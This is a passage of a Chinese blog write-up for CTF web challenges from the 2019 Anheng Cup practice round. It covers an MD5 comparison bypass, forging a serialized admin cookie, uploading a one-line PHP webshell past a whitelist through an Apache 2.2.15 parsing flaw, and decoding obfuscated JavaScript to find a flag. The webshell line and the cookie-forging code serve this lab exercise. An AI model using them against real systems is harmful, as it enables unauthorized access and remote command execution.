+<p>简单的md5 <a href="http://114.55.36.69:8004" target="_blank" rel="noopener">http://114.55.36.69:8004</a></p>
+</blockquote>
+<p>访问后右击查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy MD5 cracking &lt;!--$_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;]--&gt;fail</span><br></pre></td></tr></table></figure>
+<p>直接传参</p>
+<p><img src="\img\images\Writeup\1569589959820.png" alt="1569589959820"></p>
+<h3 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h3><blockquote>
+<p>不久前才开发的系统，功能也还不完善，代码也还有待改进 <a href="http://114.55.36.69:8014/" target="_blank" rel="noopener">http://114.55.36.69:8014/</a></p>
+</blockquote>
+<p>访问<code>http://114.55.36.69:8014/web/robots.txt</code>发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://114.55.36.69:8014/web/index.php?r=site/loginuser_1</code>右击查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>给出了github的地址，通过它找到了作者留在github上的hint</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">It&apos;s just a system which is not completed , there are some tips:</span><br><span class="line">you can use test/cib_sec to login ,but you are not admin!</span><br><span class="line">only admin can upload file ,but whichone can not bypass my rules.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">$sign = array(</span><br><span class="line">                    &apos;id&apos;=&gt;$model-&gt;id,</span><br><span class="line">                    &apos;name&apos;=&gt;$model-&gt;username,</span><br><span class="line">                    &apos;sign&apos;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[&apos;Cib_security&apos;] = serialize($sign);</span><br><span class="line">**/</span><br></pre></td></tr></table></figure>
+<p>获得了一个测试账号<code>test/cib_sec</code>和cookie生成的php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'id'</span>=&gt;$model-&gt;id,</span><br><span class="line">                    <span class="string">'name'</span>=&gt;$model-&gt;username,</span><br><span class="line">                    <span class="string">'sign'</span>=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[<span class="string">'Cib_security'</span>] = serialize($sign);</span><br></pre></td></tr></table></figure>
+<p>我们用测试账号登陆</p>
+<p>发现权限是游客，upload功能无法使用</p>
+<p><img src="\img\images\Writeup\1569586043107.png" alt="1569586043107"></p>
+<p>我们来分析test用户的cookie，对其进行urldecode和反序列化操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span>&#123;</span><br><span class="line">  [id]=&gt;<span class="number">2</span></span><br><span class="line">  [name]=&gt;test</span><br><span class="line">  [sign]=&gt;<span class="number">7</span>cbab5cea99169139e7e6d8ff74ebb77</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据github上的生成信息来伪造管理员的cookie</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$signAdmin = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"id"</span>=&gt;<span class="number">1</span>,</span><br><span class="line">    <span class="string">"name"</span>=&gt;<span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">"sign"</span>=&gt;<span class="string">'6c5de1b510e8bdd0bc40eff99dcd03f8'</span></span><br><span class="line">);</span><br><span class="line">$cib_sec = urlencode(serialize($signAdmin));</span><br><span class="line"><span class="keyword">echo</span> $cib_sec;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>获得cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%226c5de1b510e8bdd0bc40eff99dcd03f8%22%3B%7D</span><br></pre></td></tr></table></figure>
+<p>通过burpsuite替换cookie访问upload页面</p>
+<p><img src="\img\images\Writeup\1569586575730.png" alt="1569586575730"></p>
+<p>成功访问upload页面</p>
+<p><img src="\img\images\Writeup\1569586616551.png" alt="1569586616551"></p>
+<p>我们利用上传点来上传我们的webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把<code>test.php.png</code>当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制。</p>
+<p><img src="\img\images\Writeup\1569586798936.png" alt="1569586798936"></p>
+<p>成功上传，访问得到flag</p>
+<p><img src="\img\images\Writeup\1569586832636.png" alt="1569586832636"></p>
+<h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><blockquote>
+<p>玩个蛇皮 <a href="http://114.55.36.69:8011" target="_blank" rel="noopener">http://114.55.36.69:8011</a></p>
+</blockquote>
+<p>这个题是一个用js实现的贪吃蛇游戏</p>
+<p><img src="\img\images\Writeup\1569586981298.png" alt="1569586981298"></p>
+<p>玩一局就可以看到它的长度显示了出来，右击查看源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Game<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"./css/game.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"game-area"</span> <span class="attr">tabindex</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./js/game.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var mySnakeBoard = new SNAKE.Board(  &#123;</span></span><br><span class="line"><span class="undefined">                                            boardContainer: "game-area",</span></span><br><span class="line"><span class="undefined">                                            fullScreen: true</span></span><br><span class="line"><span class="undefined">                                        &#125;);    </span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里加载了<code>game.js</code>文件，我们访问<code>http://114.55.36.69:8011/js/game.js</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (me.snakeLength &gt; 2500)&#123;</span><br><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到当长度&gt;2500时执行这段aaencode代码，直接利用firebug进行调试， 执行加密结果，返回为一个假的flag，执行代码后，DOM树, 发现window[‘flag’]选项，发现flag</p>
+<p><img src="\img\images\Writeup\1569589283882.png" alt="1569589283882"></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/安恒杯Web安全测试大赛/">安恒杯Web安全测试大赛</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://flag0.com/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/" data-title="2019安恒杯Web安全测试大赛练习赛Writeup | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2019/09/27/一个hackerone的有趣的漏洞的复现Writeup/"  title="一个hackerone的有趣的漏洞的复现Writeup">
+ <strong>下一篇：</strong><br/> 
+ <span>一个hackerone的有趣的漏洞的复现Writeup
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#爱い窒息、痛"><span class="toc-number">1.</span> <span class="toc-text">爱い窒息、痛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.</span> <span class="toc-text">dedecms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新的新闻搜索"><span class="toc-number">3.</span> <span class="toc-text">新的新闻搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常规操作"><span class="toc-number">4.</span> <span class="toc-text">常规操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新闻搜索"><span class="toc-number">5.</span> <span class="toc-text">新闻搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个hackerone的有趣的漏洞的复现"><span class="toc-number">6.</span> <span class="toc-text">一个hackerone的有趣的漏洞的复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#奇怪的恐龙特性"><span class="toc-number">7.</span> <span class="toc-text">奇怪的恐龙特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新瓶装旧酒"><span class="toc-number">8.</span> <span class="toc-text">新瓶装旧酒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleepcms"><span class="toc-number">9.</span> <span class="toc-text">sleepcms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5"><span class="toc-number">10.</span> <span class="toc-text">md5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的md5"><span class="toc-number">11.</span> <span class="toc-text">简单的md5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#秘密的系统"><span class="toc-number">12.</span> <span class="toc-text">秘密的系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#game"><span class="toc-number">13.</span> <span class="toc-text">game</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
